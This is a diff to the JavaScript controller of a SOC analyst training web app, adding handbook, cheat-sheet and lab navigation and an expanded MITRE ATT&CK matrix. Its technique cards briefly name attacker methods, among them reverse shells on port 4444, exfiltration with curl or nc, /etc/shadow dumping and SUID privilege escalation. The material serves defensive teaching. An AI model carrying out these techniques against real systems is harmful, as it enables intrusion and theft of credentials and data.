@@ -1,16 +1,23 @@
 // SAMRUDH SOC ANALYST - Application Controller
 
-let activeMode = "notebook"; // "notebook" | "interview" | "cover"
+let activeMode = "notebook"; // "notebook" | "interview" | "cover" | "advanced"
 let currentPageId = 1;
 let currentQAId = 1;
+let currentAdvancedPageId = parseInt(localStorage.getItem("advanced_current_page") || "1");
+let currentCheatPageId = parseInt(localStorage.getItem("cheatsheet_current_page") || "1");
 let bookmarkedPages = JSON.parse(localStorage.getItem("soc_bookmarked_pages") || "[]");
 let bookmarkedAdvancedPages = JSON.parse(localStorage.getItem("adv_bookmarked_pages") || "[]");
+let bookmarkedCheatPages = JSON.parse(localStorage.getItem("soc_bookmarked_cheatsheets") || "[]");
 let bookmarkedQAs = JSON.parse(localStorage.getItem("soc_bookmarked_qas") || "[]");
 let completedPages = JSON.parse(localStorage.getItem("soc_completed_pages") || "[]");
+let completedAdvancedPages = JSON.parse(localStorage.getItem("advanced_completed_pages") || "[]");
+let completedCheatPages = JSON.parse(localStorage.getItem("cheatsheet_completed_pages") || "[]");
 let completedQAs = JSON.parse(localStorage.getItem("soc_completed_qas") || "[]");
+let completedLabIds = JSON.parse(localStorage.getItem("soc_completed_labs") || "[]");
 let currentFilter = "all";
 
 document.addEventListener("DOMContentLoaded", () => {
+  initSplashScreen();
   initPWA();
   initModeTabs();
   initSidebar();
@@ -18,6 +25,43 @@ document.addEventListener("DOMContentLoaded", () => {
   setupEventListeners();
   setupMobileNav();
 });
+
+// --- SPLASH SCREEN LOADING TRANSITION ---
+function initSplashScreen() {
+  const splash = document.getElementById("splash-screen");
+  const bar = document.getElementById("splash-progress-bar");
+  const statusText = document.getElementById("splash-status-text");
+  const pctLabel = document.getElementById("splash-pct-label");
+
+  if (!splash || !bar) return;
+
+  const steps = [
+    { pct: 20, text: "⚡ Initializing Security Engine..." },
+    { pct: 45, text: "🛡️ Loading 365-Page Linux Handbook..." },
+    { pct: 75, text: "💻 Loading 456-Page Advanced SOC Analyst Handbook..." },
+    { pct: 95, text: "🚀 Preparing Blue Team Cyber Environment..." },
+    { pct: 100, text: "✅ Platform Ready!" }
+  ];
+
+  let currentStep = 0;
+  const interval = setInterval(() => {
+    if (currentStep < steps.length) {
+      const step = steps[currentStep];
+      bar.style.width = step.pct + "%";
+      if (statusText) statusText.innerText = step.text;
+      if (pctLabel) pctLabel.innerText = step.pct + "%";
+      currentStep++;
+    } else {
+      clearInterval(interval);
+      setTimeout(() => {
+        splash.classList.add("fade-out");
+        setTimeout(() => {
+          splash.style.display = "none";
+        }, 650);
+      }, 350);
+    }
+  }, 320);
+}
 
 // --- MOBILE NAV SETUP ---
 function setupMobileNav() {
@@ -49,6 +93,10 @@ function setupMobileNav() {
       currentPageId--; renderCurrentView("prev"); updateActiveSidebarItem();
     } else if (activeMode === "interview" && currentQAId > 1) {
       currentQAId--; renderCurrentView("prev"); updateActiveSidebarItem();
+    } else if (activeMode === "advanced" && currentAdvancedPageId > 1) {
+      currentAdvancedPageId--;
+      localStorage.setItem("advanced_current_page", currentAdvancedPageId);
+      renderCurrentView("prev"); updateActiveSidebarItem();
     }
   });
 
@@ -57,6 +105,10 @@ function setupMobileNav() {
       currentPageId++; renderCurrentView("next"); updateActiveSidebarItem();
     } else if (activeMode === "interview" && currentQAId < INTERVIEW_QUESTIONS.length) {
       currentQAId++; renderCurrentView("next"); updateActiveSidebarItem();
+    } else if (activeMode === "advanced" && currentAdvancedPageId < (window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456)) {
+      currentAdvancedPageId++;
+      localStorage.setItem("advanced_current_page", currentAdvancedPageId);
+      renderCurrentView("next"); updateActiveSidebarItem();
     }
   });
 
@@ -121,15 +173,30 @@ function switchMode(mode) {
   } else if (mode === "cheatsheet") {
     const tab = document.getElementById("tab-cheatsheet");
     if (tab) tab.classList.add("active");
-    document.getElementById("toolbar-controls").style.display = "none";
+    const cheatCount = window.CHEATSHEET_PAGES ? window.CHEATSHEET_PAGES.length : 350;
+    document.getElementById("page-type-label").innerText = "Cheat";
+    document.getElementById("total-count-label").innerText = cheatCount;
+    document.getElementById("page-number-input").max = cheatCount;
+    document.getElementById("page-number-input").value = currentCheatPageId;
+    document.getElementById("toolbar-controls").style.display = "flex";
   } else if (mode === "labs") {
     const tab = document.getElementById("tab-labs");
     if (tab) tab.classList.add("active");
-    document.getElementById("toolbar-controls").style.display = "none";
+    const labsCount = window.INCIDENT_LABS ? window.INCIDENT_LABS.length : 5;
+    document.getElementById("page-type-label").innerText = "Lab Case";
+    document.getElementById("total-count-label").innerText = labsCount;
+    document.getElementById("page-number-input").max = labsCount;
+    document.getElementById("page-number-input").value = currentActiveLabIndex + 1;
+    document.getElementById("toolbar-controls").style.display = "flex";
   } else if (mode === "advanced") {
     const tab = document.getElementById("tab-advanced");
     if (tab) tab.classList.add("active");
-    document.getElementById("toolbar-controls").style.display = "none";
+    const advCount = window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456;
+    document.getElementById("page-type-label").innerText = "Advanced";
+    document.getElementById("total-count-label").innerText = advCount;
+    document.getElementById("page-number-input").max = advCount;
+    document.getElementById("page-number-input").value = currentAdvancedPageId;
+    document.getElementById("toolbar-controls").style.display = "flex";
   } else if (mode === "cover") {
     document.getElementById("tab-cover").classList.add("active");
     document.getElementById("toolbar-controls").style.display = "none";
@@ -178,18 +245,65 @@ function initSidebar() {
       navContainer.appendChild(catGroup);
     });
   } else if (activeMode === "advanced") {
-    navContainer.innerHTML = `
-      <div style="padding:1.8rem 1.2rem; color:var(--text-ink); text-align:center;">
-        <div style="font-size:2.2rem; margin-bottom:0.6rem;">🔒</div>
-        <div style="font-family:var(--font-sans); color:var(--accent-blue); font-size:1.05rem; font-weight:800; margin-bottom:0.4rem;">
-          Advanced Domain (Locked Preview)
-        </div>
-        <p style="font-size:0.82rem; color:#64748b; font-weight:600; line-height:1.45; margin:0;">
-          The 365-Page Master Handbook covers Module 0 through Module 11.<br><br>
-          Advanced Terminal & Simulation labs unlock in the upcoming version release.
-        </p>
-      </div>
-    `;
+    const advModules = window.ADVANCED_DOMAIN_MODULES || [];
+    const advPages = window.ADVANCED_DOMAIN_PAGES || [];
+
+    advModules.forEach(mod => {
+      const pagesInMod = advPages.filter(p => p.moduleId === mod.id);
+      const modGroup = createSidebarGroup(mod.title, `${pagesInMod.length} Pgs`);
+      
+      pagesInMod.forEach(page => {
+        const isSaved = bookmarkedAdvancedPages.includes(page.id) ? "⭐ " : "";
+        const item = createSidebarItem(page.id, `${isSaved}${page.concept}`, `P.${page.id}`, page.id === currentAdvancedPageId, () => {
+          currentAdvancedPageId = page.id;
+          localStorage.setItem("advanced_current_page", currentAdvancedPageId);
+          renderCurrentView();
+          updateActiveSidebarItem();
+        });
+        modGroup.appendChild(item);
+      });
+      navContainer.appendChild(modGroup);
+    });
+  } else if (activeMode === "cheatsheet") {
+    const csModules = window.CHEATSHEET_MODULES || [];
+    const csPages = window.CHEATSHEET_PAGES || [];
+
+    csModules.forEach(mod => {
+      const pagesInMod = csPages.filter(p => p.moduleId === mod.id);
+      const modGroup = createSidebarGroup(mod.title, `${pagesInMod.length} Pgs`);
+      
+      pagesInMod.forEach(page => {
+        const isSaved = bookmarkedCheatPages.includes(page.id) ? "⭐ " : "";
+        const isDone = completedCheatPages.includes(page.id) ? "✓ " : "";
+        const item = createSidebarItem(page.id, `${isDone}${isSaved}${page.cmd} — ${page.title}`, `P.${page.id}`, page.id === currentCheatPageId, () => {
+          currentCheatPageId = page.id;
+          localStorage.setItem("cheatsheet_current_page", currentCheatPageId);
+          renderCurrentView();
+          updateActiveSidebarItem();
+        });
+        modGroup.appendChild(item);
+      });
+      navContainer.appendChild(modGroup);
+    });
+  } else if (activeMode === "labs") {
+    const categories = window.INCIDENT_LAB_CATEGORIES || [];
+    const labs = window.INCIDENT_LABS || [];
+    
+    categories.forEach(cat => {
+      const labsInCat = labs.filter(l => l.categoryId === cat.id);
+      const catGroup = createSidebarGroup(cat.title, `${labsInCat.length} Labs`);
+      
+      labsInCat.forEach(lab => {
+        const isDone = completedLabIds.includes(lab.id) ? "✓ " : "";
+        const item = createSidebarItem(`lab-${lab.id}`, `${isDone}${lab.severity === 'CRITICAL' ? '🚨' : '⚡'} ${lab.title}`, `Lab ${lab.labNumber}`, (lab.labNumber - 1) === currentActiveLabIndex, () => {
+          currentActiveLabIndex = lab.labNumber - 1;
+          renderCurrentView();
+          updateActiveSidebarItem();
+        });
+        catGroup.appendChild(item);
+      });
+      navContainer.appendChild(catGroup);
+    });
   } else if (activeMode === "cover") {
     navContainer.innerHTML = `
       <div style="padding:1rem; color:var(--text-ink); font-weight:600;">
@@ -208,7 +322,14 @@ function createSidebarGroup(title, range) {
 
 function createSidebarItem(id, labelText, badgeText, isActive, onClick) {
   const item = document.createElement("div");
-  const isDone = activeMode === "interview" ? completedQAs.includes(id) : completedPages.includes(id);
+  let isDone = false;
+  if (activeMode === "interview") {
+    isDone = completedQAs.includes(id);
+  } else if (activeMode === "advanced") {
+    isDone = completedAdvancedPages.includes(id);
+  } else {
+    isDone = completedPages.includes(id);
+  }
   item.className = `page-item ${isActive ? 'active' : ''} ${isDone ? 'completed-item' : ''}`;
   item.setAttribute("data-item-id", id);
   item.innerHTML = `<span>${isDone ? '✓ ' : ''}${labelText}</span><span class="page-num">${badgeText}</span>`;
@@ -223,7 +344,7 @@ function updateActiveSidebarItem() {
   } else if (activeMode === "interview") {
     targetId = currentQAId;
   } else if (activeMode === "advanced") {
-    targetId = currentPageId;
+    targetId = currentAdvancedPageId;
   }
   document.querySelectorAll(".page-item").forEach(item => {
     const id = parseInt(item.getAttribute("data-item-id"));
@@ -267,11 +388,23 @@ function renderCurrentView(direction = "next") {
   } else if (activeMode === "hardening") {
     container.innerHTML = generateHardeningHTML();
   } else if (activeMode === "cheatsheet") {
-    container.innerHTML = generateCheatSheetHTML();
+    const csPages = window.CHEATSHEET_PAGES || [];
+    const page = csPages.find(p => p.id === currentCheatPageId) || csPages[0];
+    if (page) {
+      document.getElementById("page-number-input").value = currentCheatPageId;
+      updateBookmarkButtonState(currentCheatPageId);
+      container.innerHTML = generateCheatPageHTML(page);
+    }
   } else if (activeMode === "labs") {
     container.innerHTML = generateIncidentLabsHTML();
   } else if (activeMode === "advanced") {
-    container.innerHTML = generateAdvancedHTML();
+    const advPages = window.ADVANCED_DOMAIN_PAGES || [];
+    const page = advPages.find(p => p.id === currentAdvancedPageId);
+    if (page) {
+      document.getElementById("page-number-input").value = currentAdvancedPageId;
+      updateBookmarkButtonState(currentAdvancedPageId);
+      container.innerHTML = generateAdvancedPageHTML(page);
+    }
   } else if (activeMode === "cover") {
     container.innerHTML = generateBrandCoverHTML();
   }
@@ -612,8 +745,15 @@ function applyTerminalColorScheme(scheme) {
 let celebratedMilestones = JSON.parse(localStorage.getItem("soc_celebrated_milestones") || "[]");
 
 function togglePageCompletion(mode, id) {
-  let list = mode === "interview" ? completedQAs : completedPages;
-  const storageKey = mode === "interview" ? "soc_completed_qas" : "soc_completed_pages";
+  let list = completedPages;
+  let storageKey = "soc_completed_pages";
+  if (mode === "interview") {
+    list = completedQAs;
+    storageKey = "soc_completed_qas";
+  } else if (mode === "advanced") {
+    list = completedAdvancedPages;
+    storageKey = "advanced_completed_pages";
+  }
 
   const idx = list.indexOf(id);
   let nowCompleted = false;
@@ -783,9 +923,169 @@ function triggerConfetti(bannerTitle) {
 
 // --- GENERATE BRAND COVER PAGE HTML ---
 
-function generateAdvancedHTML(page) {
-  // Reuse existing page HTML generator for advanced domain pages
-  return generatePageHTML(page);
+function generateAdvancedPageHTML(page) {
+  const isFirstPage = page.id === 1;
+  const isLastPage = page.id === (window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456);
+  const modObj = window.ADVANCED_DOMAIN_MODULES ? window.ADVANCED_DOMAIN_MODULES.find(m => m.id === page.moduleId) : null;
+  const moduleTitle = modObj ? modObj.title : `Module ${page.moduleId}`;
+
+  return `
+    <article class="ruled-paper advanced-notebook-page">
+      <img src="logo.png" alt="ADVANCED SOC ANALYST HANDBOOK" class="brand-watermark-stamp" />
+
+      ${isFirstPage ? `
+        <div style="background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(59, 130, 246, 0.15)); border: 2px solid var(--accent-blue); padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
+          <img src="logo.png" style="width: 80px; height: 80px; margin-bottom: 0.5rem;" />
+          <h1 style="font-family: 'Outfit', sans-serif; color: var(--accent-blue); font-size: 1.8rem; margin: 0;">🛡️ ADVANCED SOC ANALYST HANDBOOK</h1>
+          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">400+ PAGE MASTER HANDBOOK — TELUGU-ENGLISH + TECHNICAL ENGLISH</p>
+          <div style="display: flex; justify-content: center; gap: 0.8rem; margin-top: 0.8rem; font-size: 0.85rem; flex-wrap: wrap;">
+            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🛡️ 400+ Advanced Pages</span>
+            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🔴 Endpoint, SIEM, DFIR & Cloud</span>
+            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">⚡ Practical SOC Ready</span>
+          </div>
+        </div>
+      ` : ''}
+
+      ${isLastPage ? `
+        <div style="background: linear-gradient(135deg, rgba(234, 179, 8, 0.18), rgba(34, 197, 94, 0.18)); border: 2px solid #eab308; padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
+          <div style="font-size: 3rem; margin-bottom: 0.2rem;">🏆 🎓 🛡️</div>
+          <h1 style="font-family: 'Outfit', sans-serif; color: #eab308; font-size: 2rem; margin: 0;">ADVANCED SOC MASTER CERTIFICATION</h1>
+          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">CONGRATULATIONS! YOU HAVE COMPLETED ALL 400+ ADVANCED SOC ANALYST PAGES!</p>
+        </div>
+      ` : ''}
+
+      <header class="page-header-row">
+        <div class="concept-title-box">
+          <h2>${escapeHTML(page.concept)}</h2>
+          <span class="concept-tag">${escapeHTML(moduleTitle)}</span>
+        </div>
+        <div class="page-stamp">ADVANCED PAGE ${page.id}</div>
+      </header>
+
+      ${page.explanation ? `
+        <div class="section-block">
+          <div class="section-label">💡 SIMPLE EXPLANATION (TELUGU-ENGLISH)</div>
+          <p class="handwritten-text">"${escapeHTML(page.explanation)}"</p>
+        </div>
+      ` : ''}
+
+      ${page.whyItMatters ? `
+        <div class="section-block">
+          <div class="section-label">⚡ WHY IT MATTERS (SOC PERSPECTIVE)</div>
+          <p class="handwritten-text">"${escapeHTML(page.whyItMatters)}"</p>
+        </div>
+      ` : ''}
+
+      ${page.technicalConcept ? `
+        <div class="section-block">
+          <div class="section-label">🧠 TECHNICAL CONCEPT & MECHANISM</div>
+          <div class="technical-concept-box" style="background:var(--bg-app); border:1px solid var(--card-border); padding:1rem; border-radius:8px; font-size:0.92rem; color:var(--text-ink);">
+            ${escapeHTML(page.technicalConcept)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.command ? `
+        <div class="section-block">
+          <div class="section-label">💻 COMMAND / QUERY / SYNTAX</div>
+          ${page.syntax ? `<div class="syntax-box">SYNTAX: ${escapeHTML(page.syntax)}</div>` : ''}
+          <div class="cmd-box">$ ${escapeHTML(page.command)}</div>
+        </div>
+      ` : ''}
+
+      ${page.example ? `
+        <div class="section-block">
+          <div class="section-label">🖥️ TERMINAL / LOG / PCAP EXAMPLE</div>
+          <div class="cmd-box">${escapeHTML(page.example)}</div>
+          ${page.cmdExplanation ? `<p class="handwritten-text" style="margin-top:0.5rem;">"${escapeHTML(page.cmdExplanation)}"</p>` : ''}
+        </div>
+      ` : ''}
+
+      ${page.investigation ? `
+        <div class="section-block">
+          <div class="section-label">🔎 SOC INVESTIGATION WORKFLOW</div>
+          <div class="investigation-flow-box" style="background:rgba(56, 189, 248, 0.1); border:1px dashed var(--accent-blue); padding:0.8rem 1.2rem; border-radius:8px; font-weight:700; color:var(--accent-blue); font-size:0.9rem;">
+            ${escapeHTML(page.investigation)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.detection ? `
+        <div class="section-block">
+          <div class="section-label">🛡️ DETECTION / DEFENSIVE VIEW</div>
+          <p class="handwritten-text">"${escapeHTML(page.detection)}"</p>
+        </div>
+      ` : ''}
+
+      ${page.mitre ? `
+        <div class="section-block">
+          <div class="section-label">🧩 MITRE ATT&CK FRAMEWORK MAPPING</div>
+          <div style="background:rgba(168, 85, 247, 0.1); border:1px solid #8b5cf6; padding:0.6rem 1rem; border-radius:8px; font-weight:700; color:#8b5cf6; font-size:0.88rem;">
+            🎯 ${escapeHTML(page.mitre)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.tryIt ? `
+        <div class="sticky-note">
+          "🧪 <strong>TRY IT PRACTICAL EXERCISE:</strong> ${escapeHTML(page.tryIt)}"
+        </div>
+      ` : ''}
+
+      ${page.scenario ? `
+        <div class="section-block" style="margin-top:1rem;">
+          <div class="section-label">🚨 REAL SOC SCENARIO</div>
+          <div style="background:rgba(239, 68, 68, 0.08); border-left:4px solid #ef4444; padding:0.8rem 1rem; border-radius:0 8px 8px 0; font-size:0.9rem; color:var(--text-ink);">
+            ${escapeHTML(page.scenario)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.proTip ? `
+        <div class="pro-tip-box" style="margin-top:1rem;">
+          💡 <strong>SOC ANALYST PRO-TIP:</strong> ${escapeHTML(page.proTip)}
+        </div>
+      ` : ''}
+
+      ${page.commonMistakes ? `
+        <div class="section-block" style="margin-top:1rem;">
+          <div class="section-label">⚠️ COMMON BEGINNER MISTAKES</div>
+          <div style="background:rgba(245, 158, 11, 0.1); border-left:4px solid #f59e0b; padding:0.6rem 1rem; border-radius:0 8px 8px 0; font-size:0.88rem; color:var(--text-ink);">
+            ${escapeHTML(page.commonMistakes)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.interviewQ ? `
+        <div class="section-block" style="margin-top:1rem;">
+          <div class="section-label">🎯 INTERVIEW CONNECTION</div>
+          <div style="background:rgba(16, 185, 129, 0.08); border-left:4px solid #10b981; padding:0.6rem 1rem; border-radius:0 8px 8px 0; font-size:0.88rem; color:var(--text-ink);">
+            <strong>Q:</strong> ${escapeHTML(page.interviewQ)}
+          </div>
+        </div>
+      ` : ''}
+
+      ${page.noteVisual ? `
+        <div class="section-block" style="margin-top:1rem;">
+          <div class="section-label">✏️ HANDWRITTEN VISUAL DIAGRAM</div>
+          <div class="diagram-box" style="white-space:pre-wrap; font-family:'Fira Code', monospace; font-size:0.85rem;">${escapeHTML(page.noteVisual)}</div>
+        </div>
+      ` : ''}
+
+      ${page.quickRevision ? `
+        <div class="section-block" style="margin-top:1rem;">
+          <div class="section-label">⚡ QUICK REVISION BULLETS</div>
+          <div style="background:var(--bg-app); border:1px solid var(--card-border); padding:0.8rem 1.2rem; border-radius:8px; font-size:0.88rem; white-space:pre-wrap;">${escapeHTML(page.quickRevision)}</div>
+        </div>
+      ` : ''}
+
+      <div class="page-completion-footer" style="margin-top:1.5rem;">
+        <button class="btn-mark-complete ${completedAdvancedPages.includes(page.id) ? 'completed' : ''}" onclick="togglePageCompletion('advanced', ${page.id})">
+          ${completedAdvancedPages.includes(page.id) ? '✓ Completed' : '☑️ Mark as Complete'}
+        </button>
+      </div>
+    </article>
+  `;
 }
 
 function generateBrandCoverHTML() {
@@ -1440,78 +1740,111 @@ function stopSpeech() {
   }
 }
 
-// --- JUMP TO PAGE HELPER ---
-function jumpToPage(pageId) {
-  switchMode("notebook");
-  currentPageId = pageId;
-  renderCurrentView();
-  updateActiveSidebarItem();
-}
-
 // --- MITRE ATT&CK INTERACTIVE MATRIX DATA & RENDERER ---
 const MITRE_ATTACK_MATRIX = [
   {
     tactic: "Initial Access",
     icon: "🚪",
     techniques: [
-      { id: "T1190", name: "Exploit Public Application", desc: "Exploiting web servers or public services.", pageId: 136 },
-      { id: "T1078", name: "Valid Accounts", desc: "Using stolen credentials or default SSH logins.", pageId: 86 }
+      { id: "T1190", name: "Exploit Public Application", desc: "Exploiting web applications, Apache, or Nginx RCE vulnerabilities.", pageId: 136 },
+      { id: "T1078", name: "Valid Accounts", desc: "Abusing compromised local or domain credentials for SSH logins.", pageId: 86 },
+      { id: "T1133", name: "External Remote Services", desc: "Unauthorized access via exposed SSH or VPN services.", pageId: 43 }
     ]
   },
   {
     tactic: "Execution",
     icon: "⚙️",
     techniques: [
-      { id: "T1059.004", name: "Unix Shell Execution", desc: "Executing malicious commands via Bash/sh.", pageId: 166 },
-      { id: "T1053.003", name: "Cron Job Persistence", desc: "Scheduling persistence via crontab.", pageId: 111 }
+      { id: "T1059.004", name: "Unix Shell Execution", desc: "Executing malicious commands via Bash, sh, or dash.", pageId: 166 },
+      { id: "T1053.003", name: "Cron Scheduled Task", desc: "Executing malicious payloads via user/system crontabs.", pageId: 111 },
+      { id: "T1204.002", name: "Malicious File Execution", desc: "Executing untrusted ELF binaries or scripts from /tmp.", pageId: 60 }
     ]
   },
   {
     tactic: "Persistence",
     icon: "📌",
     techniques: [
-      { id: "T1543.002", name: "systemd Service Backdoor", desc: "Creating malicious systemd unit files.", pageId: 115 },
-      { id: "T1546.004", name: ".bashrc Profile Hijack", desc: "Adding shell aliases or startup scripts.", pageId: 170 }
+      { id: "T1543.002", name: "systemd Service Backdoor", desc: "Creating persistent malicious systemd unit files.", pageId: 115 },
+      { id: "T1546.004", name: ".bashrc Profile Hijack", desc: "Adding shell aliases or startup scripts in user profiles.", pageId: 170 },
+      { id: "T1098", name: "Account Manipulation", desc: "Adding unauthorized SSH keys to ~/.ssh/authorized_keys.", pageId: 85 }
     ]
   },
   {
     tactic: "Privilege Escalation",
     icon: "🔓",
     techniques: [
-      { id: "T1548.001", name: "SUID Executable Abuse", desc: "Abusing GTFOBins SUID binary permissions.", pageId: 95 },
-      { id: "T1548.002", name: "Sudoers Misconfiguration", desc: "NOPASSWD sudo privilege escalation.", pageId: 100 }
+      { id: "T1548.001", name: "SUID Binary Executable Abuse", desc: "Abusing GTFOBins SUID permissions for instant root shell.", pageId: 95 },
+      { id: "T1548.002", name: "Sudoers Misconfiguration", desc: "Exploiting NOPASSWD sudo privileges for root access.", pageId: 100 },
+      { id: "T1068", name: "Kernel Exploit PrivEsc", desc: "Abusing Dirty COW or Dirty Pipe kernel bugs.", pageId: 1 }
     ]
   },
   {
     tactic: "Defense Evasion",
     icon: "🥷",
     techniques: [
-      { id: "T1070.002", name: "Clear Linux System Logs", desc: "Wiping /var/log/auth.log or .bash_history.", pageId: 196 },
-      { id: "T1562.001", name: "Disable Firewall", desc: "Stopping ufw, iptables, or firewalld.", pageId: 140 }
+      { id: "T1070.002", name: "Clear System Logs", desc: "Wiping /var/log/auth.log, syslog, or .bash_history.", pageId: 196 },
+      { id: "T1562.001", name: "Disable Security Tools", desc: "Stopping ufw firewall, iptables, or auditd daemon.", pageId: 140 },
+      { id: "T1027", name: "Obfuscated Commands", desc: "Executing base64-encoded strings or hidden files.", pageId: 61 }
     ]
   },
   {
     tactic: "Credential Access",
     icon: "🔑",
     techniques: [
-      { id: "T1003.008", name: "/etc/shadow Hash Dumping", desc: "Reading password hashes from shadow file.", pageId: 90 },
-      { id: "T1555", name: "Credentials in Files", desc: "Searching for cleartext API keys or passphrases.", pageId: 168 }
+      { id: "T1003.008", name: "/etc/shadow Hash Dumping", desc: "Reading encrypted password hashes from /etc/shadow.", pageId: 90 },
+      { id: "T1555", name: "Credentials in Files", desc: "Hunting for cleartext API keys, passwords, or DB creds.", pageId: 168 },
+      { id: "T1110.001", name: "SSH Password Brute Force", desc: "Automated dictionary password attacks on SSH port 22.", pageId: 71 }
     ]
   },
   {
     tactic: "Discovery",
     icon: "🔎",
     techniques: [
-      { id: "T1083", name: "File & Directory Discovery", desc: "Enumerating system paths using find/ls.", pageId: 61 },
-      { id: "T1057", name: "Process Discovery", desc: "Listing running processes via ps aux / top.", pageId: 112 },
-      { id: "T1049", name: "Network Connections", desc: "Analyzing listening ports via ss -tulpn.", pageId: 142 }
+      { id: "T1083", name: "File & Directory Discovery", desc: "Enumerating system paths using find, ls, and locate.", pageId: 58 },
+      { id: "T1057", name: "Process Discovery", desc: "Listing active processes via ps aux, pstree, and top.", pageId: 29 },
+      { id: "T1049", name: "Network Connection Discovery", desc: "Auditing listening ports and sockets via ss -tulpn.", pageId: 43 }
+    ]
+  },
+  {
+    tactic: "Lateral Movement",
+    icon: "↔️",
+    techniques: [
+      { id: "T1021.004", name: "SSH Lateral Movement", desc: "Pivoting across internal hosts using stolen SSH keys.", pageId: 85 },
+      { id: "T1563", name: "Remote Service Hijacking", desc: "Hijacking active tmux or screen terminal sessions.", pageId: 9 }
+    ]
+  },
+  {
+    tactic: "Collection",
+    icon: "📦",
+    techniques: [
+      { id: "T1005", name: "Data from Local System", desc: "Staging sensitive database dumps or customer records.", pageId: 65 },
+      { id: "T1560", name: "Archive Collected Data", desc: "Compressing stolen files into tar.gz or zip archives.", pageId: 65 }
+    ]
+  },
+  {
+    tactic: "Command & Control",
+    icon: "🎛️",
+    techniques: [
+      { id: "T1095", name: "Non-Application Protocol C2", desc: "Outbound reverse TCP shell connections on port 4444.", pageId: 44 },
+      { id: "T1071.001", name: "Web Service C2", desc: "HTTP/HTTPS beaconing to attacker C2 domains.", pageId: 50 },
+      { id: "T1071.004", name: "DNS Tunneling", desc: "Exfiltrating data or receiving commands via DNS TXT records.", pageId: 51 }
     ]
   },
   {
     tactic: "Exfiltration",
     icon: "📡",
     techniques: [
-      { id: "T1048", name: "Exfiltration Over Protocol", desc: "Transferring sensitive data over DNS/HTTP.", pageId: 150 }
+      { id: "T1048.003", name: "Exfiltration Over Alternative Protocol", desc: "Sending compressed files via curl, wget, or nc.", pageId: 53 },
+      { id: "T1567", name: "Exfiltration to Cloud Storage", desc: "Uploading stolen data to Mega, AWS S3, or GCS.", pageId: 53 }
+    ]
+  },
+  {
+    tactic: "Impact",
+    icon: "💥",
+    techniques: [
+      { id: "T1486", name: "Data Encrypted for Impact", desc: "Executing ransomware binaries to encrypt system drives.", pageId: 155 },
+      { id: "T1489", name: "Service Stop", desc: "Killing critical web, database, or security services.", pageId: 127 },
+      { id: "T1499", name: "Endpoint Denial of Service", desc: "Consuming 100% CPU/RAM via fork bombs or crypto miners.", pageId: 32 }
     ]
   }
 ];
@@ -1520,22 +1853,26 @@ function generateMitreMatrixHTML() {
   return `
     <article class="mitre-matrix-wrapper">
       <div class="mitre-matrix-header">
-        <h2>🗺️ MITRE ATT&CK Interactive Linux SOC Matrix</h2>
+        <h2 style="font-family:'Outfit',sans-serif; color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem;">
+          🗺️ Enterprise MITRE ATT&CK Interactive Linux SOC Matrix
+        </h2>
         <p style="color:var(--text-dark); font-size:0.92rem; margin-top:0.4rem;">
-          Click any MITRE technique card below to jump directly to the corresponding 365-Page Handbook page for triage & threat hunting!
+          Click any of the <strong>36 MITRE Technique Cards</strong> below to jump directly to the target 365-Page Handbook page for live threat hunting & investigation!
         </p>
       </div>
 
-      <div class="mitre-grid">
+      <div class="mitre-grid" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(220px, 1fr)); gap:1rem; margin-top:1.5rem;">
         ${MITRE_ATTACK_MATRIX.map(col => `
-          <div class="mitre-column">
-            <div class="mitre-tactic-title">${col.icon} ${col.tactic}</div>
+          <div class="mitre-column" style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; display:flex; flex-direction:column; gap:0.8rem;">
+            <div class="mitre-tactic-title" style="font-weight:800; font-size:0.95rem; color:var(--accent-blue); border-bottom:2px solid var(--accent-blue); padding-bottom:0.4rem;">
+              ${col.icon} ${col.tactic}
+            </div>
             ${col.techniques.map(tech => `
-              <div class="mitre-tech-card" onclick="jumpToPage(${tech.pageId})">
-                <span class="mitre-tech-id">${tech.id}</span>
-                <div class="mitre-tech-name">${tech.name}</div>
-                <div class="mitre-tech-desc">${tech.desc}</div>
-                <div style="font-size:0.75rem; color:var(--accent-blue); margin-top:0.5rem; font-weight:700;">
+              <div class="mitre-tech-card" style="background:var(--bg-app); border:1px solid var(--card-border); border-radius:8px; padding:0.7rem; cursor:pointer; transition:transform 0.2s;" onclick="jumpToPage(${tech.pageId})">
+                <span class="mitre-tech-id" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); padding:0.15rem 0.45rem; border-radius:6px; font-weight:800; font-size:0.74rem;">${tech.id}</span>
+                <div class="mitre-tech-name" style="font-weight:800; font-size:0.88rem; color:var(--text-ink); margin:0.3rem 0;">${tech.name}</div>
+                <div class="mitre-tech-desc" style="font-size:0.76rem; color:var(--text-dark);">${tech.desc}</div>
+                <div style="font-size:0.75rem; color:var(--accent-blue); margin-top:0.4rem; font-weight:700;">
                   ➡️ Open Page P.${tech.pageId}
                 </div>
               </div>
@@ -1547,45 +1884,74 @@ function generateMitreMatrixHTML() {
   `;
 }
 
-// --- 1. SIEM LOG PARSER LAB ENGINE ---
+// --- SIEM LOG PARSER LAB ENGINE (10 REALISTIC INCIDENT PRESETS) ---
 const SAMPLE_LOGS = {
-  bruteforce: `Aug 01 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2
-Aug 01 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2
